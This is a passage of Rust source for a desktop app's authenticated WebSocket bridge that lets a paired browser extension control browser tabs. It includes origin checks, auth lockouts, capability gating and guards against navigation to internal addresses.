        let (Some(request_id), Some(code)) = (parsed.request_id, parsed.code) else {
            Self::write_http(
                stream,
                "400 Bad Request",
                "text/plain",
                "requestId and code are required",
            )
            .await;
            return;
        };

        let extension_id =
            match take_confirmed_pair_request(&state.pending, request_id.trim(), &code).await {
                Ok(extension_id) => extension_id,
                Err(error) => {
                    tracing::warn!("SEC-11: /pair/confirm rejected — {}", error);
                    Self::write_http(stream, "401 Unauthorized", "text/plain", &error).await;
                    return;
                }
            };

        match install(Some(&extension_id)) {
            Ok(installed_locations) => {
                tracing::info!(
                    "SEC-11: /pair/confirm installed the native messaging manifest for extension {} at {} location(s)",
                    extension_id,
                    installed_locations
                );
            }
            Err(error) => {
                tracing::warn!(
                    "SEC-11: /pair/confirm could not install the manifest for extension {}: {}",
                    extension_id,
                    error
                );
                Self::write_http(
                    stream,
                    "500 Internal Server Error",
                    "text/plain",
                    "Could not install the native messaging manifest",
                )
                .await;
                return;
            }
        }

        let new_token = random_hex(32);
        let fingerprint = new_token[..8].to_string();
        *state.pair_token.write().await = new_token.clone();

        if let Some(app_handle) = state.app_handle.as_ref() {
            let _ = app_handle.emit("bridge:pair-request-confirmed", &request_id);
        }

        let body = serde_json::json!({
            "token": new_token,
            "fingerprint": fingerprint,
            "nativeHostManifestInstalled": true,
        })
        .to_string();
        Self::write_http_json(stream, "200 OK", &body).await;
    }

    async fn handle_pair_legacy_route<F>(
        stream: &mut TcpStream,
        header_section: &str,
        state: &PairEndpointState,
        install: F,
    ) where
        F: Fn(Option<&str>) -> Result<usize, String>,
    {
        let extension_id = match parse_pair_extension_id(header_section) {
            Ok(extension_id) => extension_id,
            Err(error) => {
                Self::write_http(stream, "400 Bad Request", "text/plain", &error).await;
                return;
            }
        };

        if extension_id.is_some() {
            let local_bridge_secret = state.bridge_token.read().await.clone();
            if !is_pair_manifest_install_authorized(header_section, &local_bridge_secret) {
                tracing::warn!(
                    "SEC-11: /pair manifest install rejected — X-Bridge-Token did not match the desktop bridge secret"
                );
                Self::write_http(
                    stream,
                    "401 Unauthorized",
                    "text/plain",
                    "Unauthorized manifest install",
                )
                .await;
                return;
            }
        }

        let native_host_manifest_installed = if let Some(extension_id) = extension_id.as_deref() {
            match install(Some(extension_id)) {
                Ok(installed_locations) => {
                    tracing::info!(
                        "E2: /pair refreshed native messaging manifest for extension {} at {} location(s)",
                        extension_id,
                        installed_locations
                    );
                    true
                }
                Err(error) => {
                    tracing::warn!(
                        "E2: /pair could not refresh native messaging manifest for extension {}: {}",
                        extension_id,
                        error
                    );
                    false
                }
            }
        } else {
            false
        };

        let new_token = random_hex(32);
        let fingerprint = new_token[..8].to_string();

        *state.pair_token.write().await = new_token.clone();

        tracing::info!(
            "E2: /pair issued new token with fingerprint {}",
            fingerprint
        );

        let body = serde_json::json!({
            "token": new_token,
            "fingerprint": fingerprint,
            "nativeHostManifestInstalled": native_host_manifest_installed,
        })
        .to_string();
        Self::write_http_json(stream, "200 OK", &body).await;
    }
    // ─────────────────────────────────────────────────────────────────────────

    async fn handle_connection_wrapper(
        stream: TcpStream,
        peer: SocketAddr,
        clients: Arc<TokioMutex<HashMap<String, WebSocketClient>>>,
        senders: Arc<TokioMutex<HashMap<String, SplitSink<WebSocketStream<TcpStream>, Message>>>>,
        presence: Arc<PresenceManager>,
        token: String,
        app_handle: Option<tauri::AppHandle>,
        auth_failures: Arc<TokioMutex<HashMap<IpAddr, AuthFailureRecord>>>,
    ) -> Result<(), Box<dyn std::error::Error>> {
        // RT-04 fix: validate Origin header during the WebSocket handshake.
        // `accept_hdr_async_with_config` lets us inspect the HTTP upgrade request
        // before the connection is established AND cap per-frame size.
        #[allow(
            clippy::result_large_err,
            reason = "tungstenite handshake callbacks require ErrorResponse by value"
        )]
        let callback = |request: &Request, response: Response| -> Result<Response, ErrorResponse> {
            let origin = request
                .headers()
                .get("origin")
                .and_then(|v| v.to_str().ok());

            if !is_origin_allowed(origin) {
                tracing::warn!(
                    "RT-04: WebSocket upgrade rejected from disallowed origin: {:?}",
                    origin
                );
                let rejected = origin.unwrap_or("<none>").to_string();
                // We can't capture `rejected_origin` here due to borrow rules,
                // so we embed the rejection in the error response reason phrase.
                let _ = rejected; // used via tracing above
                let err_response = ErrorResponse::new(Some("Origin not allowed".to_string()));
                return Err(err_response);
            }
            Ok(response)
        };

        // SEV-DESK-01: bound per-frame size. tungstenite default is 64 MiB;
        // none of our valid messages are anywhere near 4 MiB. A peer that
        // sends a frame above this gets disconnected at the protocol layer
        // before any deserialisation runs.
        let ws_config = WebSocketConfig {
            max_message_size: Some(MAX_WS_MESSAGE_SIZE),
            max_frame_size: Some(MAX_WS_MESSAGE_SIZE),
            ..Default::default()
        };

        let ws_stream = match accept_hdr_async_with_config(stream, callback, Some(ws_config)).await
        {
            Ok(ws) => ws,
            Err(e) => {
                tracing::warn!(
                    "RT-04: WebSocket handshake failed (origin check or protocol error): {}",
                    e
                );
                return Ok(()); // connection is already closed; not an error we need to propagate
            }
        };

        // RT-04 fix: enforce a hard timeout for the initial auth message.
        // Wrap the whole connection handler so that a client that never sends
        // auth is cleaned up after AUTH_TIMEOUT.
        let handle_fut = Self::handle_connection(
            ws_stream,
            peer,
            clients,
            senders,
            presence,
            token,
            app_handle,
            auth_failures,
        );
        // The auth itself is handled inside `handle_connection`; the timeout
        // there is enforced by the `tokio::time::timeout` around `ws_stream.next()`.
        handle_fut.await;
        Ok(())
    }

    async fn handle_connection(
        mut ws_stream: WebSocketStream<TcpStream>,
        peer: SocketAddr,
        clients: Arc<TokioMutex<HashMap<String, WebSocketClient>>>,
        senders: Arc<TokioMutex<HashMap<String, SplitSink<WebSocketStream<TcpStream>, Message>>>>,
        presence: Arc<PresenceManager>,
        token: String,
        app_handle: Option<tauri::AppHandle>,
        auth_failures: Arc<TokioMutex<HashMap<IpAddr, AuthFailureRecord>>>,
    ) {
        // Enforce Authentication
        tracing::debug!("Waiting for authentication...");
        let mut user_id_from_auth: Option<String> = None;
        let mut team_id_from_auth: Option<String> = None;

        // RT-04 fix: the first message must arrive within AUTH_TIMEOUT.
        let first_msg = tokio::time::timeout(AUTH_TIMEOUT, ws_stream.next()).await;
        let auth_failure_reason = if let Ok(Some(Ok(Message::Text(text)))) = first_msg {
            if let Ok(RealtimeEvent::Authenticate {
                user_id,
                team_id,
                token: auth_token,
            }) = serde_json::from_str::<RealtimeEvent>(&text)
            {
                if let Some(sent_token) = auth_token {
                    if sent_token.len() == token.len()
                        && bool::from(sent_token.as_bytes().ct_eq(token.as_bytes()))
                    {
                        user_id_from_auth = Some(user_id);
                        team_id_from_auth = team_id;
                        tracing::info!(
                            "Authentication successful for user: {:?}",
                            user_id_from_auth
                        );
                        None
                    } else {
                        tracing::warn!("Authentication failed: Invalid token");
                        Some("Invalid authentication token for realtime websocket".to_string())
                    }
                } else {
                    tracing::warn!("Authentication failed: Missing token");
                    Some("Missing authentication token for realtime websocket".to_string())
                }
            } else {
                tracing::warn!("Authentication failed: Invalid event format");
                Some("Invalid authentication event format".to_string())
            }
        } else {
            // Connection closed, non-text message received, or 2-second auth timeout expired.
            Some("Realtime websocket closed or timed out before authentication".to_string())
        };

        if let Some(reason) = auth_failure_reason {
            // SEV-DESK-01: record the failure against the source IP. If this
            // crosses MAX_AUTH_FAILURES inside the rolling window, future
            // connections from this IP are rejected at the listener for
            // LOCKOUT_DURATION.
            Self::record_auth_failure(&auth_failures, peer.ip()).await;

            if let Ok(auth_error_message) =
                serde_json::to_string(&RealtimeEvent::AuthenticationFailed {
                    reason: reason.clone(),
                })
            {
                let _ = ws_stream.send(Message::Text(auth_error_message)).await;
            }
            let _ = ws_stream.close(None).await;
            tracing::warn!(
                "Connection closed due to authentication failure from {}: {}",
                peer,
                reason
            );
            return;
        }

        // SEV-DESK-01: success — clear any prior failure budget for this IP
        // so a transient typo or token-rotation race does not poison future
        // connections.
        Self::clear_auth_failures(&auth_failures, peer.ip()).await;

        if let Some(user_id) = &user_id_from_auth {
            if let Ok(auth_ok_message) = serde_json::to_string(&RealtimeEvent::Authenticated {
                user_id: user_id.clone(),
            }) {
                if let Err(e) = ws_stream.send(Message::Text(auth_ok_message)).await {
                    tracing::warn!("Failed to send realtime auth acknowledgement: {}", e);
                }
            }
        }

        let (sender, receiver) = ws_stream.split();
        let client_id = uuid::Uuid::new_v4().to_string();

        {
            let mut clients_lock = clients.lock().await;
            clients_lock.insert(
                client_id.clone(),
                WebSocketClient {
                    id: client_id.clone(),
                    user_id: user_id_from_auth,
                    team_id: team_id_from_auth,
                    current_resource: None,
                    capabilities: ExtensionCapabilities::none(),
                },
            );
        }

        {
            let mut senders_lock = senders.lock().await;
            senders_lock.insert(client_id.clone(), sender);
        }

        Self::handle_messages(
            receiver,
            &client_id,
            &clients,
            &senders,
            &presence,
            app_handle.as_ref(),
        )
        .await;

        {
            let mut clients_lock = clients.lock().await;
            if let Some(client) = clients_lock.get(&client_id) {
                if let Some(user_id) = &client.user_id {
                    presence.set_offline(user_id).await;
                }
            }
            clients_lock.remove(&client_id);
        }

        {
            let mut senders_lock = senders.lock().await;
            senders_lock.remove(&client_id);
        }

        tracing::info!("Client disconnected: {}", client_id);
    }

    async fn handle_messages(
        mut receiver: SplitStream<WebSocketStream<TcpStream>>,
        client_id: &str,
        clients: &Arc<TokioMutex<HashMap<String, WebSocketClient>>>,
        senders: &Arc<TokioMutex<HashMap<String, SplitSink<WebSocketStream<TcpStream>, Message>>>>,
        presence: &Arc<PresenceManager>,
        app_handle: Option<&tauri::AppHandle>,
    ) {
        while let Some(Ok(msg)) = receiver.next().await {
            if let Message::Text(text) = msg {
                if let Ok(event) = serde_json::from_str::<RealtimeEvent>(&text) {
                    Self::handle_event(event, client_id, clients, senders, presence, app_handle)
                        .await;
                }
            }
        }
    }

    async fn handle_event(
        event: RealtimeEvent,
        client_id: &str,
        clients: &Arc<TokioMutex<HashMap<String, WebSocketClient>>>,
        senders: &Arc<TokioMutex<HashMap<String, SplitSink<WebSocketStream<TcpStream>, Message>>>>,
        presence: &Arc<PresenceManager>,
        app_handle: Option<&tauri::AppHandle>,
    ) {
        match &event {
            RealtimeEvent::Authenticate {
                user_id, team_id, ..
            } => {
                // Block re-authentication for already-authenticated clients
                {
                    let clients_lock = clients.lock().await;
                    if let Some(client) = clients_lock.get(client_id) {
                        if client.user_id.is_some() {
                            tracing::warn!(
                                "Ignoring re-authentication attempt for already-authenticated client: {}",
                                client_id
                            );
                            return;
                        }
                    }
                }
                {
                    let mut clients_lock = clients.lock().await;
                    if let Some(client) = clients_lock.get_mut(client_id) {
                        client.user_id = Some(user_id.clone());
                        client.team_id = team_id.clone();
                    }
                }
                presence.set_online(user_id).await;
                tracing::info!("Client authenticated: {} as user {}", client_id, user_id);
            }

            RealtimeEvent::GoalCreated { .. } => {
                if let Some(team_id) = Self::get_client_team(client_id, clients).await {
                    Self::broadcast_to_team(&team_id, event.clone(), clients, senders).await;
                }
            }

            RealtimeEvent::GoalUpdated { .. } => {
                if let Some(team_id) = Self::get_client_team(client_id, clients).await {
                    Self::broadcast_to_team(&team_id, event.clone(), clients, senders).await;
                }
            }

            RealtimeEvent::WorkflowUpdated { .. } => {
                if let Some(team_id) = Self::get_client_team(client_id, clients).await {
                    Self::broadcast_to_team(&team_id, event.clone(), clients, senders).await;
                }
            }

            RealtimeEvent::UserTyping {
                ref resource_id, ..
            } => {
                // Track the resource this client is interacting with
                {
                    let mut clients_lock = clients.lock().await;
                    if let Some(client_entry) = clients_lock.get_mut(client_id) {
                        client_entry.current_resource = Some(resource_id.clone());
                    }
                }
                Self::broadcast_to_resource(resource_id, event.clone(), clients, senders).await;
            }

            RealtimeEvent::CursorMoved { .. } => {
                if let Some(team_id) = Self::get_client_team(client_id, clients).await {
                    Self::broadcast_to_team(&team_id, event.clone(), clients, senders).await;
                }
            }

            RealtimeEvent::NativeMessage { id, payload } => {
                tracing::info!("Received native message: {} {:?}", id, payload);
                let native_type = payload
                    .get("type")
                    .and_then(Value::as_str)
                    .map(str::to_string)
                    .unwrap_or_else(|| "unknown".to_string());
                let started_at = Instant::now();

                if let Some(app) = app_handle {
                    let tool_name = format!("extension_native_{}", native_type);
                    emit_tool_started(app, id, &tool_name, Some(payload.clone()));
                }

                let granted = {
                    let clients_lock = clients.lock().await;
                    clients_lock
                        .get(client_id)
                        .map(|client| client.capabilities.clone())
                        .unwrap_or_else(ExtensionCapabilities::none)
                };

                let execution =
                    Self::execute_native_message(payload.clone(), app_handle, &granted).await;
                let duration_ms = started_at.elapsed().as_millis() as u64;

                if execution.is_ok() {
                    let renegotiated = match native_type.as_str() {
                        "connect" => Some(Self::negotiated_capabilities(&payload)),
                        "disconnect" => Some(ExtensionCapabilities::none()),
                        _ => None,
                    };
                    if let Some(capabilities) = renegotiated {
                        let mut clients_lock = clients.lock().await;
                        if let Some(client) = clients_lock.get_mut(client_id) {
                            client.capabilities = capabilities;
                        }
                    }
                }

                let response = match execution {
                    Ok(data) => RealtimeEvent::NativeResponse {
                        id: id.clone(),
                        success: true,
                        data: Some(data),
                        error: None,
                    },
                    Err(error) => RealtimeEvent::NativeResponse {
                        id: id.clone(),
                        success: false,
                        data: None,
                        error: Some(error),
                    },
                };

                if let Some(app) = app_handle {
                    let (success, result, error) = match &response {
                        RealtimeEvent::NativeResponse {
                            success,
                            data,
                            error,
                            ..
                        } => (*success, data.clone(), error.clone()),
                        _ => (
                            false,
                            None,
                            Some("Unexpected native response type".to_string()),
                        ),
                    };

                    if success {
                        emit_tool_completed(
                            app,
                            id,
                            result.clone().unwrap_or_else(|| json!({})),
                            duration_ms,
                        );
                    } else {
                        emit_tool_error(
                            app,
                            id,
                            error
                                .as_deref()
                                .unwrap_or("Native extension request failed"),
                            duration_ms,
                            true,
                        );
                    }

                    // Avoid duplicate/conflicting extension task events for message types
                    // that already emit dedicated events in their execution handlers.
                    let emit_generic_task_event = !matches!(
                        native_type.as_str(),
                        "page_context"
                            | "task_result"
                            | "ping"
                            | "connect"
                            | "disconnect"
                            | "selected_text_query"
                    );

                    if emit_generic_task_event {
                        let task_event = json!({
                            "task_id": id,
                            "success": success,
                            "result": result,
                            "error": error,
                            "actions_performed": 1,
                            "duration": duration_ms,
                            "metadata": {
                                "native_type": native_type
                            }
                        });

                        if let Err(event_error) = app.emit("extension:task-result", &task_event) {
                            tracing::warn!(
                                "Failed to emit extension:task-result from native message: {}",
                                event_error
                            );
                        }
                    }
                }

                let message = Message::Text(serde_json::to_string(&response).unwrap_or_default());
                let mut senders_lock = senders.lock().await;
                if let Some(sender) = senders_lock.get_mut(client_id) {
                    let _ = sender.send(message).await;
                }
            }

            _ => {
                tracing::debug!("Unhandled event type: {:?}", event);
            }
        }
    }

    async fn get_client_team(
        client_id: &str,
        clients: &Arc<TokioMutex<HashMap<String, WebSocketClient>>>,
    ) -> Option<String> {
        let clients_lock = clients.lock().await;
        clients_lock.get(client_id).and_then(|c| c.team_id.clone())
    }

    async fn broadcast_to_team(
        team_id: &str,
        event: RealtimeEvent,
        clients: &Arc<TokioMutex<HashMap<String, WebSocketClient>>>,
        senders: &Arc<TokioMutex<HashMap<String, SplitSink<WebSocketStream<TcpStream>, Message>>>>,
    ) {
        let message = Message::Text(serde_json::to_string(&event).unwrap_or_default());
        let clients_lock = clients.lock().await;
        let mut senders_lock = senders.lock().await;

        for (client_id, client) in clients_lock.iter() {
            if client.team_id.as_deref() == Some(team_id) {
                if let Some(sender) = senders_lock.get_mut(client_id) {
                    let _ = sender.send(message.clone()).await;
                }
            }
        }
    }

    async fn broadcast_to_resource(
        resource_id: &str,
        event: RealtimeEvent,
        clients: &Arc<TokioMutex<HashMap<String, WebSocketClient>>>,
        senders: &Arc<TokioMutex<HashMap<String, SplitSink<WebSocketStream<TcpStream>, Message>>>>,
    ) {
        let message = Message::Text(serde_json::to_string(&event).unwrap_or_default());
        let clients_lock = clients.lock().await;
        let mut senders_lock = senders.lock().await;

        for (client_id, client) in clients_lock.iter() {
            // Only send to clients that are actively interacting with this resource
            let is_on_resource = client
                .current_resource
                .as_deref()
                .is_some_and(|r| r == resource_id);
            if client.user_id.is_some() && is_on_resource {
                if let Some(sender) = senders_lock.get_mut(client_id) {
                    let _ = sender.send(message.clone()).await;
                }
            }
        }
    }

    async fn broadcast_to_specific_user(
        user_id: &str,
        event: RealtimeEvent,
        clients: &Arc<TokioMutex<HashMap<String, WebSocketClient>>>,
        senders: &Arc<TokioMutex<HashMap<String, SplitSink<WebSocketStream<TcpStream>, Message>>>>,
    ) -> Result<(), String> {
        let message = Message::Text(
            serde_json::to_string(&event)
                .map_err(|e| format!("Failed to serialize event: {}", e))?,
        );

        let clients_lock = clients.lock().await;
        let mut senders_lock = senders.lock().await;
        let mut delivered = false;

        for (client_id, client) in clients_lock.iter() {
            if client.user_id.as_deref() == Some(user_id) {
                if let Some(sender) = senders_lock.get_mut(client_id) {
                    let _ = sender.send(message.clone()).await;
                    delivered = true;
                }
            }
        }

        if delivered {
            Ok(())
        } else {
            Err(format!("User {} not connected", user_id))
        }
    }

    /// Capabilities the peer declared in its `connect` payload, clamped to what
    /// the bridge is allowed to grant. An absent or malformed declaration
    /// negotiates nothing.
    fn negotiated_capabilities(payload: &Value) -> ExtensionCapabilities {
        let declared = payload
            .get("capabilities")
            .and_then(|declared| {
                serde_json::from_value::<ExtensionCapabilities>(declared.clone()).ok()
            })
            .unwrap_or_else(ExtensionCapabilities::none);
        ExtensionCapabilities::negotiate(&declared)
    }

    /// Where a realtime-bridge peer may drive the live browser.
    ///
    /// `ensure_navigation_url_allowed` settles the scheme and the blocked-host
    /// list for every navigation in the app, including the ones the user types.
    /// This adds what only holds when a bridge peer picked the destination: no
    /// loopback, private, carrier-grade-NAT, or link-local target, so the peer
    /// cannot aim the browser at a dev server, a LAN device, or a cloud
    /// metadata endpoint and read the answer back over the same socket.
    ///
    /// A hostname that does not resolve inside the timeout is refused rather
    /// than waved through: a resolver that stalls, fails, or answers
    /// differently each time is the mechanism a rebinding attack runs on.
    async fn ensure_bridge_navigation_allowed(url: &str) -> Result<(), String> {
        let candidate = url.trim();
        if candidate.eq_ignore_ascii_case(BLANK_DOCUMENT_URL) {
            return Ok(());
        }
        ensure_navigation_url_allowed(candidate)?;

        let Ok(parsed) = url::Url::parse(candidate) else {
            return Err(
                "Navigation is blocked: the target is not an absolute http(s) URL.".to_string(),
            );
        };
        let Some(host) = parsed.host() else {
            return Err("Navigation is blocked: the target http(s) URL has no host.".to_string());
        };

        let internal = match host {
            url::Host::Ipv4(address) => is_internal_ipv4(address),
            url::Host::Ipv6(address) => is_internal_ipv6(address),
            url::Host::Domain(name) if is_loopback_domain(name) => true,
            url::Host::Domain(name) => match resolve_navigation_host(name).await {
                Some(addresses) => addresses.is_empty() || addresses.iter().any(is_internal_ip),
                None => {
                    tracing::warn!("blocked bridge navigation to unresolvable host: {name}");
                    return Err(format!(
                        "Navigation to {name} is blocked: the host did not resolve, so where it points cannot be checked."
                    ));
                }
            },
        };

        if internal {
            tracing::warn!("blocked bridge navigation to internal destination: {candidate}");
            return Err(
                "Navigation is blocked: automated browsing may not reach loopback, private, or link-local addresses."
                    .to_string(),
            );
        }

        Ok(())
    }

    /// Whether the bridge may hand a peer what the live document holds.
    ///
    /// The navigation guard only sees the first hop. A page a peer opened can
    /// redirect into an internal service, so the destination is re-checked from
    /// the document itself before its markup, text, or pixels leave the browser.
    /// Address literals are enough here — the metadata and router endpoints a
    /// redirect chain lands on are literals — and skipping DNS keeps every read
    /// off the resolver.
    fn ensure_document_readable(url: &str) -> Result<(), String> {
        let candidate = url.trim();
        if candidate.is_empty() || candidate.eq_ignore_ascii_case(BLANK_DOCUMENT_URL) {
            return Ok(());
        }
        let Ok(parsed) = url::Url::parse(candidate) else {
            return Ok(());
        };

        let scheme = parsed.scheme().to_ascii_lowercase();
        if !matches!(scheme.as_str(), "http" | "https") {
            tracing::warn!("blocked bridge read of a {scheme}: document");
            return Err(format!(
                "Reading a {scheme}: document over the extension bridge is blocked."
            ));
        }

        let internal = match parsed.host() {
            Some(url::Host::Ipv4(address)) => is_internal_ipv4(address),
            Some(url::Host::Ipv6(address)) => is_internal_ipv6(address),
            Some(url::Host::Domain(name)) => is_loopback_domain(name),
            None => true,
        };

        if internal {
            tracing::warn!("blocked bridge read of an internal document: {candidate}");
            return Err(
                "Reading this page over the extension bridge is blocked: the tab is on a loopback, private, or link-local address."
                    .to_string(),
            );
        }

        Ok(())
    }

    async fn get_native_cdp_client_for_read(
        app_handle: &tauri::AppHandle,
        requested_tab_id: Option<i32>,
    ) -> Result<(Arc<CdpClient>, String), String> {
        let (client, resolved_tab_id) =
            Self::get_native_cdp_client(app_handle, requested_tab_id, false, None).await?;
        let landed = client.get_url().await.map_err(|e| e.to_string())?;
        Self::ensure_document_readable(&landed)?;
        Ok((client, resolved_tab_id))
    }

    async fn execute_native_message(
        payload: Value,
        app_handle: Option<&tauri::AppHandle>,
        capabilities: &ExtensionCapabilities,
    ) -> Result<Value, String> {
        let message: NativeMessage = serde_json::from_value(payload)
            .map_err(|e| format!("Invalid native message payload: {}", e))?;

        if let Some(required) = NativeCapability::required_for(&message) {
            if !capabilities.grants(required) {
                tracing::warn!(
                    "refused native message: connection never negotiated {} capability",
                    required.label()
                );
                return Err(format!(
                    "Native message refused: this connection has no {} capability.",
                    required.label()
                ));
            }
        }

        match message {
            NativeMessage::Ping => Ok(json!({ "pong": true })),

            NativeMessage::Connect { extension_id } => {
                if !is_valid_chrome_extension_id(&extension_id) {
                    return Err("Invalid Chrome extension destination".to_string());
                }

                if let Some(app) = app_handle {
                    if let Some(native_state) =
                        app.try_state::<crate::sys::commands::NativeMessagingStateWrapper>()
                    {
                        *native_state.extension_id.write().await = Some(extension_id.clone());
                        let mut state = native_state.state.write().await;
                        state.connection_state = ConnectionState::Connected;
                        state.extension_id = Some(extension_id.clone());
                    }

                    if let Err(e) = app.emit(
                        "extension:connection-status",
                        &json!({
                            "connected": true,
                            "status": "connected",
                            "extension_id": extension_id,
                            "timestamp": chrono::Utc::now().timestamp_millis()
                        }),
                    ) {
                        tracing::warn!(
                            "Failed to emit extension:connection-status (connected): {}",
                            e
                        );
                    }
                }

                Ok(json!({
                    "connected": true,
                    "extension_id": extension_id,
                    "version": env!("CARGO_PKG_VERSION")
                }))
            }

            NativeMessage::Disconnect { reason } => {
                if let Some(app) = app_handle {
                    if let Some(native_state) =
                        app.try_state::<crate::sys::commands::NativeMessagingStateWrapper>()
                    {
                        *native_state.extension_id.write().await = None;
                        let mut state = native_state.state.write().await;
                        state.connection_state = ConnectionState::Disconnected;
                        state.extension_id = None;
                    }

                    if let Err(e) = app.emit(
                        "extension:connection-status",
                        &json!({
                            "connected": false,
                            "status": "disconnected",
                            "reason": reason,
                            "timestamp": chrono::Utc::now().timestamp_millis()
                        }),
                    ) {
                        tracing::warn!(
                            "Failed to emit extension:connection-status (disconnected): {}",
                            e
                        );
                    }
                }

                Ok(json!({
                    "disconnected": true,
                    "reason": reason
                }))
            }

            NativeMessage::GetTabs => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let browser_state = app.state::<BrowserStateWrapper>();
                let tab_manager = browser_state
                    .get_tab_manager()
                    .map_err(|e| format!("Browser state unavailable: {}", e))?;
                let tab_manager = tab_manager.lock().await;
                let active_tab_id = tab_manager
                    .get_active_tab()
                    .await
                    .map_err(|e| e.to_string())?
                    .map(|tab| tab.id);
                let tabs = tab_manager.list_tabs().await.map_err(|e| e.to_string())?;

                let tab_payload = tabs
                    .into_iter()
                    .map(|tab| {
                        json!({
                            "id": tab.id,
                            "url": tab.url,
                            "title": tab.title,
                            "active": active_tab_id.as_ref() == Some(&tab.id),
                            "favicon_url": tab.favicon,
                            "status": if tab.loading { "loading" } else { "complete" }
                        })
                    })
                    .collect::<Vec<_>>();

                Ok(json!({ "tabs": tab_payload }))
            }

            NativeMessage::GetActiveTab => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let browser_state = app.state::<BrowserStateWrapper>();
                let tab_manager = browser_state
                    .get_tab_manager()
                    .map_err(|e| format!("Browser state unavailable: {}", e))?;
                let tab_manager = tab_manager.lock().await;
                let tab = tab_manager
                    .get_active_tab()
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "active_tab": tab
                }))
            }

            NativeMessage::CreateTab { url } => {
                Self::ensure_bridge_navigation_allowed(&url).await?;
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let browser_state = app.state::<BrowserStateWrapper>();
                let tab_manager = browser_state
                    .get_tab_manager()
                    .map_err(|e| format!("Browser state unavailable: {}", e))?;
                let tab_id = tab_manager
                    .lock()
                    .await
                    .open_tab(&url)
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "created": true,
                    "tab_id": tab_id,
                    "url": url
                }))
            }

            NativeMessage::CloseTab { tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let browser_state = app.state::<BrowserStateWrapper>();
                let tab_manager = browser_state
                    .get_tab_manager()
                    .map_err(|e| format!("Browser state unavailable: {}", e))?;
                tab_manager
                    .lock()
                    .await
                    .close_tab(&tab_id.to_string())
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "closed": true,
                    "tab_id": tab_id
                }))
            }

            NativeMessage::SwitchTab { tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let browser_state = app.state::<BrowserStateWrapper>();
                let tab_manager = browser_state
                    .get_tab_manager()
                    .map_err(|e| format!("Browser state unavailable: {}", e))?;
                tab_manager
                    .lock()
                    .await
                    .switch_to_tab(&tab_id.to_string())
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "switched": true,
                    "tab_id": tab_id
                }))
            }

            NativeMessage::Navigate { url, tab_id } => {
                Self::ensure_bridge_navigation_allowed(&url).await?;
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, tab_id, true, Some(&url)).await?;
                client.navigate(&url).await.map_err(|e| e.to_string())?;

                Ok(json!({
                    "navigated": true,
                    "tab_id": resolved_tab_id,
                    "url": url
                }))
            }

            NativeMessage::Click { selector, tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
                client
                    .click_element(&selector)
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "clicked": true,
                    "tab_id": resolved_tab_id,
                    "selector": selector
                }))
            }

            NativeMessage::Type {
                selector,
                text,
                tab_id,
            } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
                client
                    .type_into_element(&selector, &text, false)
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "typed": true,
                    "tab_id": resolved_tab_id,
                    "selector": selector,
                    "chars": text.chars().count()
                }))
            }

            NativeMessage::GetElement { selector, tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                // JSON-encode the selector into a JS string literal (quotes + full
                // escaping included). Single-quote-only escaping was insufficient —
                // backslashes/newlines could break out of the literal and inject JS.
                let selector_js = serde_json::to_string(&selector).map_err(|e| e.to_string())?;
                let script = format!(
                    r#"(function() {{
                        const el = document.querySelector({});
                        if (!el) return null;
                        return {{
                            tag_name: el.tagName.toLowerCase(),
                            id: el.id || null,
                            class_name: el.className || null,
                            text_content: (el.textContent || '').trim(),
                            inner_html: el.innerHTML || '',
                            outer_html: el.outerHTML || ''
                        }};
                    }})()"#,
                    selector_js
                );
                let element = client.evaluate(&script).await.map_err(|e| e.to_string())?;

                Ok(json!({
                    "tab_id": resolved_tab_id,
                    "selector": selector,
                    "element": element
                }))
            }

            NativeMessage::GetElements { selector, tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                let elements = client
                    .query_all(&selector)
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "tab_id": resolved_tab_id,
                    "selector": selector,
                    "elements": elements
                }))
            }

            NativeMessage::GetText { selector, tab_id } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                let text = client
                    .get_text(&selector)
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "tab_id": resolved_tab_id,
                    "selector": selector,
                    "text": text
                }))
            }

            NativeMessage::GetAttribute {
                selector,
                attribute,
                tab_id,
            } => {
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
                let value = client
                    .get_attribute(&selector, &attribute)
                    .await
                    .map_err(|e| e.to_string())?;

                Ok(json!({
                    "tab_id": resolved_tab_id,
                    "selector": selector,
                    "attribute": attribute,
                    "value": value
                }))
            }

            NativeMessage::SetAttribute {
                selector,
                attribute,
                value,
                tab_id,
            } => {
                ensure_peer_attribute_write_allowed(&attribute, &value)?;
                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                let (client, resolved_tab_id) =
                    Self::get_native_cdp_client(app, tab_id, false, None).await?;

                // Escape values for safe interpolation into JS string literals.
